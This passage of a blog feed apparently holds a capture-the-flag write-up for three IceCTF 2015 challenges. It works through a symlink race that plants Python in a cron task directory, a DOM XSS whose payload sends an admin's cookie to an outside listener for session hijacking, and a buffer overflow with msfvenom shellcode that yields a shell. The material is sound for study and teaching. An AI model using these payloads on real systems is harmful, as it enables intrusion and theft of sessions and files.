    printf(&ldquo;Please enter your name: &rdquo;);
    fgets(name, sizeof(name), stdin);
    name[sizeof(name)-1] = &lsquo;\0&rsquo;;
    name[strlen(email)-1] = &lsquo;\0&rsquo;;
    printf(&ldquo;Enter the note that you would like to save: &rdquo;);
    fgets(contents, sizeof(contents), stdin);</p>

<pre><code>// Validate the email securely
int i=0;
ptr = strtok(email, "@");
while(ptr != NULL) {
    i++;
    ptr = strtok(NULL, "@");
}
if(i != 2){
    fprintf(stderr, "Invalid email!\n");
    exit(1337); // huehue
}
if(strcmp(name,"Josh\n") == 0) {
    fprintf(stderr, "Go away Josh\n");
    exit(1);
}

upload_note(email, name, contents);

write_note(tmpfile, contents);

printf("Note saved locally.\n");
return 0;
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>There is a race condition, we can create a symlink pointing to arbitrary file,
then our data is stored here, finally the symlink is removed. The <code>cron.README</code>
hints us to use python script for executing <code>.task(s)</code>. Moreover cron needs
permission for writing to our directory.
{% codeblock %}
[ctf-7119@icectf-shell /tmp]$ mkdir .sine
[ctf-7119@icectf-shell /tmp]$ chmod 777 .sine</p>

<p>[ctf-7119@icectf-shell /tmp]$ /home/supernote/supernote
Temporary file is /home_users/ctf-7119/ctf1_yc9KGB
Welcome to SuperNote v1.1.1.1.1.1.1.1.1.1. We&rsquo;re still in beta, so please excuse some bugs.
Please enter your email address: <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#x61;&#64;&#x74;&#x65;&#115;&#x74;&#46;&#x63;&#111;&#109;">&#97;&#64;&#x74;&#x65;&#x73;&#116;&#x2e;&#x63;&#x6f;&#109;</a>
Please enter your name: ^Z
[1]  + 19597 suspended  /home/supernote/supernote</p>

<p>[ctf-7119@icectf-shell /tmp]$ ln -s /home/supernote/cron.d/1337.task /home_users/ctf-7119/ctf1_yc9KGB</p>

<p>[ctf-7119@icectf-shell /tmp]$ fg
[1]  + 19597 continued  /home/supernote/supernote
name
Enter the note that you would like to save: import shutil; import os; d=&lsquo;/tmp/.sine/flag.txt&rsquo;; shutil.copy(&lsquo;/home/supernote/flag.txt&rsquo;, d); os.chmod(d, 0777);
Note saved.
Note saved locally.</p>

<p>[ctf-7119@icectf-shell /tmp]$ date
Sun Aug 16 11:38:45 UTC 2015</p>

<p>[ctf-7119@icectf-shell /tmp]$ date
Sun Aug 16 11:39:13 UTC 2015</p>

<p>[ctf-7119@icectf-shell /tmp]$ cd .sine</p>

<p>[ctf-7119@icectf-shell /t/.sine]$ ls
flag.txt</p>

<p>[ctf-7119@icectf-shell /t/.sine]$ cat flag.txt
flag_keep_your_files_close_and_your_tempfiles_closer
{% endcodeblock %}</p>

<p>Because I was interested also what exactly is executing via <code>cron</code>, using the same technique, I did:</p>

<p>{% codeblock %}
Enter the note that you would like to save: from os import system; system(&lsquo;cp -r /usr/local/etc/supernote/* /tmp/.sine/; chmod 777 -R /tmp/.sine&rsquo;);
Note saved.
Note saved locally.</p>

<p>[ctf-7119@icectf-shell /t/.sine]$ date
Sun Aug 16 11:48:59 UTC 2015</p>

<p>[ctf-7119@icectf-shell /t/.sine]$ cat supernote.sh</p>

<h1>!/bin/bash</h1>

<p>for file in /home/supernote/cron.d/*.task; do
    /usr/bin/python $file
    rm -f $file
done</p>

<p>rm -rf /home/supernote/cron.d/<em>
rm -rf /home/supernote/cron.d/.</em> 2> /dev/null
{% endcodeblock %}</p>

<h2>Wiki &amp; The Furious</h2>

<p>DOM Based XSS challenge. The vulnerable code:
{% codeblock lang:javascript %}
var showComment = function(){
    var hash = decodeURIComponent(location.hash); // Comment ID&rsquo;s can be pretty wierd
    var $comment = $(hash);      <br/>
    if($comment.length &lt; 1)
        return;
    $(&ldquo;html,body&rdquo;).animate({
        scrollTop: $comment.offset().top
    }, 2000);
    $(&ldquo;.comment&rdquo;).css(&ldquo;background-color&rdquo;, &ldquo;&rdquo;);
    $comment.css(&ldquo;background-color&rdquo;, &ldquo;#eee&rdquo;);</p>

<p>}
$(document).ready(function(){
    $(window).bind(&ldquo;hashchange&rdquo;,showComment);
    showComment();
});
{% endcodeblock %}</p>

<p>The injected javascript code could be evaluated here:
{% codeblock lang:javascript %}
    var hash = decodeURIComponent(location.hash); // Comment ID&rsquo;s can be pretty wierd
    var $comment = $(hash);
{% endcodeblock %}</p>

<p>Test URL:
{% codeblock %}
<a href="http://furious-wiki.icec.tf/post/o1S9UqFJ3vFD9aVwkABIal78TMxcB2ur/title#">http://furious-wiki.icec.tf/post/o1S9UqFJ3vFD9aVwkABIal78TMxcB2ur/title#</a><img src="http://73696e65.github.io/" onerror="alert(String.fromCharCode(39,88,83,83,39));">
{% endcodeblock %}</p>

<p>We need to deliver the payload to admin:
{% codeblock %}
POST /report HTTP/1.1
Host: furious-wiki.icec.tf
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: <a href="http://furious-wiki.icec.tf/post/o1S9UqFJ3vFD9aVwkABIal78TMxcB2ur/title">http://furious-wiki.icec.tf/post/o1S9UqFJ3vFD9aVwkABIal78TMxcB2ur/title</a>
Cookie: PHPSESSID=s%3Ag26_c-cLthzShO_xncYWAI0qp-OtiZm4.jY5w%2F4cH7K%2B18sNhcK22aAb5%2FueHPymlOOdtyKkdhp4
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 133</p>

<p>user=o1S9UqFJ3vFD9aVwkABIal78TMxcB2ur&amp;post=title&amp;comment=title#&lt;img+src=x+onerror=this.src=&lsquo;<a href="http://xxxxxxx:3337/?">http://xxxxxxx:3337/?</a>&rsquo;%2Bdocument.cookie>
{% endcodeblock %}</p>

<p>{% codeblock %}
$ nc -l -p 3337
GET /?PHPSESSID=s%3A7ZeQMpUDARFuj_7Bmu2izwxQQnE7kmsz.sQblDjvm9VN7aEYtrmpYoB8N7HeAfajhPwFMI1LkrjM HTTP/1.1
Referer: <a href="http://localhost:3000/post/o1S9UqFJ3vFD9aVwkABIal78TMxcB2ur/title">http://localhost:3000/post/o1S9UqFJ3vFD9aVwkABIal78TMxcB2ur/title</a>
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.0.0 Safari/538.1
Accept: <em>/</em>
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: xxxxxxx:3337
{% endcodeblock %}</p>

<p>After setting cookie to the value <code>s:NO7VjJneMo5ArzEcrwTUXMIR2W9A05RU.Xg8/oyINQGJh09tP234WRlXFaE3NsBEeOHFRyN2FmCo</code>,
we was able to read the flag: <code>flag_so_simple_yet_so_hard</code>.</p>

<h2>What</h2>

<p>Simple RE challenge. There is a binary without source code, performing a
several checks:</p>

<p>{% codeblock %}</p>

<h1>Number of command line arguments should be 2</h1>

<p>=> 0x80486b2:   cmp    DWORD PTR [ebp+0x8],0x3</p>

<h1>First argument should be &lsquo;ausgeschnitzel&rsquo;</h1>

<p>=> 0x80486c5:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x80486c7:   seta   dl
   0x80486ca:   setb   al
   0x80486cd:   cmp    dl,al</p>

<h1>Second argument should be &lsquo;flugelfragen&rsquo;</h1>

<p>   0x80486de:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x80486e0:   seta   dl
   0x80486e3:   setb   al
=> 0x80486e6:   cmp    dl,al</p>

<p>gdb-peda$ set args ausgeschnitzel flugelfragen</p>

<h1>There is another check for env variable &lsquo;AUTH&rsquo;:</h1>

<p>gdb-peda$ set environment AUTH = foo</p>

<p>=> 0x80485aa:   call   0x8048440 &lt;__isoc99_sscanf@plt>
   0x80485af:   cmp    eax,0x2
Guessed arguments:
Guessed arguments:
arg[0]: 0xbfc62e5f &ndash;> 0x6f6f66 (&lsquo;foo&rsquo;)
arg[1]: 0x8048814 (&ldquo;%[^/]/%[^/]/&rdquo;)
arg[2]: 0xbfc620b0 &ndash;> 0xb77d1b58 &ndash;> 0x8048301 (&ldquo;GLIBC_2.0&rdquo;)
arg[3]: 0xbfc62030 &ndash;> 0x8048200 &ndash;> 0x39 (&lsquo;9&rsquo;)</p>

<h1>buffer overflow:</h1>

<p>set environment AUTH = Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9/schadenfreude</p>

<p>Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x37654136 in ?? ()
{% endcodeblock %}</p>

<p>On our server:
{% codeblock %}
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial</p>

<p>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/exec CMD=&ldquo;/bin/sh&rdquo; -b &lsquo;\x0a\x0d\x2f\x00&rsquo; -f sh
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
export buf=\
$&lsquo;\xbf\xd0\xe8\x51\x87\xdb\xd7\xd9\x74\x24\xf4\x5d\x31\xc9&rsquo;\
$&lsquo;\xb1\x0b\x31\x7d\x15\x83\xc5\x04\x03\x7d\x11\xe2\x25\x82&rsquo;\
$&lsquo;\x5a\xdf\x5c\x01\x3b\xb7\x73\xc5\x4a\xa0\xe3\x26\x3e\x47&rsquo;\
$&lsquo;\xf3\x50\xef\xf5\x9a\xce\x66\x1a\x0e\xe7\x71\xdd\xae\xf7&rsquo;\
$&lsquo;\xae\xbf\xc7\x99\x9f\x4c\x7f\x66\xb7\xe1\xf6\x87\xfa\x86&rsquo;
{% endcodeblock %}</p>

<p>CTF server:
{% codeblock %}
[ctf-7119@icectf-shell /home/what]$ export buf=\</p>

<blockquote><p>$&lsquo;\xbf\xd0\xe8\x51\x87\xdb\xd7\xd9\x74\x24\xf4\x5d\x31\xc9&rsquo;\
$&lsquo;\xb1\x0b\x31\x7d\x15\x83\xc5\x04\x03\x7d\x11\xe2\x25\x82&rsquo;\
$&lsquo;\x5a\xdf\x5c\x01\x3b\xb7\x73\xc5\x4a\xa0\xe3\x26\x3e\x47&rsquo;\
$&lsquo;\xf3\x50\xef\xf5\x9a\xce\x66\x1a\x0e\xe7\x71\xdd\xae\xf7&rsquo;\
$&lsquo;\xae\xbf\xc7\x99\x9f\x4c\x7f\x66\xb7\xe1\xf6\x87\xfa\x86&rsquo;</p></blockquote>

<p>[ctf-7119@icectf-shell /t/.sine]$ cp /home/what/what .</p>

<p>[ctf-7119@icectf-shell /t/.sine]$ AUTH=$(python -c &lsquo;import os; print os.environ[&ldquo;buf&rdquo;] + &ldquo;X&rdquo; * (140-len(os.environ[&ldquo;buf&rdquo;])) + &ldquo;XXXX&rdquo; + &ldquo;/schadenfreude&rdquo;&rsquo;) ./what ausgeschnitzel flugelfragen
Authenticating&hellip;
[1]    24497 segmentation fault (core dumped)  AUTH= ./what ausgeschnitzel flugelfragen</p>

<p>[ctf-7119@icectf-shell /t/.sine]$ gdb -q -ex &lsquo;q&rsquo; ./what core.24497
Reading symbols from /tmp/.sine/what&hellip;(no debugging symbols found)&hellip;done.
[New LWP 24497]
Core was generated by `./what ausgeschnitzel flugelfragen&#8217;.
Program terminated with signal 11, Segmentation fault.</p>

<h1>0  0x58585858 in ?? ()</h1>

<p>{% endcodeblock %}</p>

<p>Now we only need to jump to our shellcode</p>

<p>{% codeblock %}
[ctf-7119@icectf-shell /t/.sine]$ git clone <a href="https://github.com/hellman/fixenv">https://github.com/hellman/fixenv</a></p>

<p>[ctf-7119@icectf-shell /t/.sine/fixenv]$ export AUTH=$(python -c &lsquo;import os; print os.environ[&ldquo;buf&rdquo;] + &ldquo;X&rdquo; * (140-len(os.environ[&ldquo;buf&rdquo;])) + &ldquo;XXXX&rdquo; + &ldquo;/schadenfreude&rdquo;&rsquo;)</p>

<p>[ctf-7119@icectf-shell /t/.sine/fixenv]$ ./r.sh gdb /home/what/what ausgeschnitzel flugelfragen</p>

<p>(gdb) b *0x0804869E
Breakpoint 1 at 0x804869e</p>

<p>(gdb) r
Starting program: /tmp/.sine/fixenv/.launcher
Breakpoint 1, 0x0804869e in ?? ()
Missing separate debuginfos, use: debuginfo-install glibc-2.17-78.el7.i686</p>

<p>(gdb) x /500s $esp
&hellip;
0xffffdd25: &ldquo;AUTH=\277\320\350Q\207\333\327\331t$\364]1\311\261\v1}\025\203\305\004\003}\021\342%\202Z\337&#92;001;\267s\305J\240\343&amp;>G\363P\357\365\232\316f\032\016\347q\335\256\367\256\277\307\231\237L\177f\267\341\366\207\372\206&rdquo;, &lsquo;X&rsquo; <repeats 74 times>, &ldquo;/schadenfreude&rdquo;</p>

<p>(gdb) x /s 0xffffdd2a
0xffffdd2a: &ldquo;\277\320\350Q\207\333\327\331t$\364]1\311\261\v1}\025\203\305\004\003}\021\342%\202Z\337&#92;001;\267s\305J\240\343&amp;>G\363P\357\365\232\316f\032\016\347q\335\256\367\256\277\307\231\237L\177f\267\341\366\207\372\206&rdquo;, &lsquo;X&rsquo; <repeats 70 times>, &ldquo;0\335\377\377/schadenfreude&rdquo;
&hellip;</p>

<p>[ctf-7119@icectf-shell /t/.sine/fixenv]$ export AUTH=$(python -c &lsquo;import os; import struct; print os.environ[&ldquo;buf&rdquo;] + &ldquo;X&rdquo; * (140-len(os.environ[&ldquo;buf&rdquo;])) + struct.pack(&ldquo;&lt;I&rdquo;, 0xffffdd2a) + &ldquo;/schadenfreude&rdquo;&rsquo;)</p>

<p>[ctf-7119@icectf-shell /t/.sine/fixenv]$ ./r.sh /home/what/what ausgeschnitzel flugelfragen
Authenticating&hellip;</p>

<p>sh-4.2$ id
uid=1148(ctf-7119) gid=1102(what) groups=1002(ctf) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.2$ cat /home/what/flag.txt</p>

<p>flag_squeamish_ossifrage
{% endcodeblock %}</p>
]]></content>
  </entry>
  
</feed>
